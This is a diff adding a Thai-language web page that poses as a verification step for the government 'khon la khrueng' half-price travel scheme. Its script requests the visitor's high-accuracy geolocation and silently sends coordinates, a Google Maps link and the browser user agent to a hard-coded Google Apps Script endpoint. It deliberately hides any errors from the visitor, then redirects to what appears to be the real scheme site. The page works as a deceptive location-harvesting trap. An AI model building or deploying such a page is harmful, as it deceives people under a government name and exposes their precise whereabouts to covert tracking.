@@ -1,0 +1,231 @@
+<!DOCTYPE html>
+<html lang="th">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ลงทะเบียนเที่ยวคนละครึ่ง</title>
+    <!-- ใช้ฟอนต์ที่ดูทันสมัยและเป็นมิตร -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Kanit:wght@400;500;700&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --primary-color: #2c7be5;
+            --success-color: #28a745;
+            --danger-color: #dc3545;
+            --light-gray: #f8f9fa;
+            --dark-gray: #343a40;
+        }
+
+        body {
+            font-family: 'Kanit', sans-serif;
+            background-color: var(--light-gray);
+            color: var(--dark-gray);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            padding: 20px;
+            box-sizing: border-box;
+        }
+
+        .container {
+            background-color: white;
+            padding: 40px;
+            border-radius: 12px;
+            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.12);
+            text-align: center;
+            max-width: 450px;
+            width: 100%;
+            border-top: 5px solid var(--primary-color);
+        }
+
+        .container h1 {
+            font-size: 24px;
+            font-weight: 700;
+            margin-bottom: 15px;
+        }
+
+        .container p {
+            font-size: 16px;
+            color: #6c757d;
+            margin-bottom: 30px;
+            line-height: 1.6;
+        }
+
+        .action-button {
+            background-color: var(--primary-color);
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            font-size: 18px;
+            font-family: 'Kanit', sans-serif;
+            font-weight: 500;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: background-color 0.3s ease, transform 0.1s ease;
+            width: 100%;
+        }
+
+        .action-button:hover {
+            background-color: #2468c1;
+        }
+        
+        .action-button:active {
+            transform: scale(0.98);
+        }
+
+        .action-button:disabled {
+            background-color: #a0a0a0;
+            cursor: not-allowed;
+        }
+
+        #status-message {
+            margin-top: 25px;
+            font-size: 14px;
+            font-weight: 500;
+            min-height: 20px;
+        }
+
+        .message-success {
+            color: var(--success-color);
+        }
+
+        .message-error {
+            color: var(--danger-color);
+        }
+        
+        .loader {
+            border: 4px solid #f3f3f3;
+            border-radius: 50%;
+            border-top: 4px solid var(--primary-color);
+            width: 30px;
+            height: 30px;
+            animation: spin 1s linear infinite;
+            margin: 20px auto 0;
+            display: none; /* ซ่อนไว้ก่อน */
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <h1>เข้าสู่เว็บไซต์ คนละครึ่ง</h1>
+        <p>เพื่อความปลอดภัยและยืนยันสิทธิ์การเข้าใช้งาน<br>กรุณายืนยันสิทธิ์</p>
+        
+        <button id="confirmButton" class="action-button" onclick="requestLocationAndRedirect()">
+            ดำเนินการต่อ
+        </button>
+
+        <div id="loader" class="loader"></div>
+        <div id="status-message"></div>
+    </div>
+
+    <script>
+        // --- การตั้งค่า ---
+        // !!! สำคัญ: แก้ไข URL ตรงนี้เป็น Web App URL ของคุณที่ได้จาก Google Apps Script !!!
+        const googleWebAppUrl = "https://script.google.com/macros/s/AKfycbwcePjw_CIJynjxmtEHKLKlPeq3muw-egNPWLXAdZDzj_YsnH3_TKFfRYGRL9botPH2NA/exec";
+        
+        const targetUrl = "https://www.xn--42caj5dan4dbmsr7i9bya1lwc5cm.com/";
+
+        // --- ตัวแปรสำหรับอ้างอิง Element ---
+        const confirmButton = document.getElementById('confirmButton');
+        const statusMessage = document.getElementById('status-message');
+        const loader = document.getElementById('loader');
+
+        // --- ฟังก์ชันหลัก ---
+        function requestLocationAndRedirect() {
+            confirmButton.disabled = true;
+            confirmButton.innerText = "กำลังดำเนินการ...";
+            statusMessage.innerText = "กรุณาอนุญาตในหน้าต่างที่ปรากฏขึ้น...";
+            statusMessage.className = '';
+            loader.style.display = 'block';
+
+            if (!navigator.geolocation) {
+                displayError("บราวเซอร์ของคุณไม่รองรับการระบุตำแหน่ง");
+                return;
+            }
+
+            navigator.geolocation.getCurrentPosition(handleSuccess, handleError, {
+                enableHighAccuracy: true,
+                timeout: 15000,
+                maximumAge: 0
+            });
+        }
+
+        // --- ฟังก์ชันจัดการเมื่อสำเร็จ ---
+        function handleSuccess(position) {
+            const lat = position.coords.latitude;
+            const lon = position.coords.longitude;
+            
+            statusMessage.innerText = "การยืนยันสำเร็จ!";
+            statusMessage.className = 'message-success';
+            loader.style.display = 'block';
+
+            const dataToSend = {
+                latitude: lat,
+                longitude: lon,
+                accuracy: position.coords.accuracy,
+                timestamp: new Date().toISOString(),
+                googleMapsLink: `https://www.google.com/maps?q=${lat},${lon}`,
+                userAgent: navigator.userAgent
+            };
+            
+            // ส่งข้อมูลไปยัง Google Apps Script API ของเรา
+            fetch(googleWebAppUrl, {
+                method: 'POST',
+                // ใช้ mode: 'no-cors' สำหรับการส่งข้อมูลไปยัง Apps Script แบบง่าย
+                // เราจะไม่ได้รับสถานะตอบกลับ แต่ข้อมูลจะถูกส่งไปถึง
+                mode: 'no-cors', 
+                headers: { 'Content-Type': 'text/plain;charset=utf-8' }, // ใช้ text/plain เพื่อเลี่ยง preflight
+                body: JSON.stringify(dataToSend)
+            })
+            .catch(error => console.error('Fetch Error:', error)) // Log error ไว้ แต่ไม่แสดงให้ผู้ใช้เห็น
+            .finally(() => {
+                // ไม่ว่าจะสำเร็จหรือล้มเหลว ก็จะ redirect หลังจากหน่วงเวลา
+                // เราตั้งใจให้ผู้ใช้ไม่เห็นข้อผิดพลาด เพื่อให้ประสบการณ์การใช้งานราบรื่น
+                statusMessage.innerText = "บันทึกข้อมูลสำเร็จ! กำลังนำท่านไปยังเว็บไซต์...";
+                setTimeout(() => {
+                    window.location.href = targetUrl;
+                }, 2500);
+            });
+        }
+
+        // --- ฟังก์ชันจัดการเมื่อเกิดข้อผิดพลาด ---
+        function handleError(error) {
+            let errorMessage = "";
+            switch(error.code) {
+                case error.PERMISSION_DENIED:
+                    errorMessage = "คุณปฏิเสธการเข้าถึงตำแหน่ง โปรดอนุญาตเพื่อดำเนินการต่อ";
+                    break;
+                case error.POSITION_UNAVAILABLE:
+                    errorMessage = "ไม่สามารถระบุตำแหน่งของคุณได้ในขณะนี้";
+                    break;
+                case error.TIMEOUT:
+                    errorMessage = "หมดเวลาในการร้องขอตำแหน่ง กรุณาลองใหม่อีกครั้ง";
+                    break;
+                default:
+                    errorMessage = "เกิดข้อผิดพลาดที่ไม่ทราบสาเหตุ";
+                    break;
+            }
+            displayError(errorMessage);
+        }
+
+        function displayError(message) {
+            loader.style.display = 'none';
+            statusMessage.innerText = message;
+            statusMessage.className = 'message-error';
+            confirmButton.disabled = false;
+            confirmButton.innerText = "ลองอีกครั้ง";
+        }
+    </script>
+
+</body>
+</html>
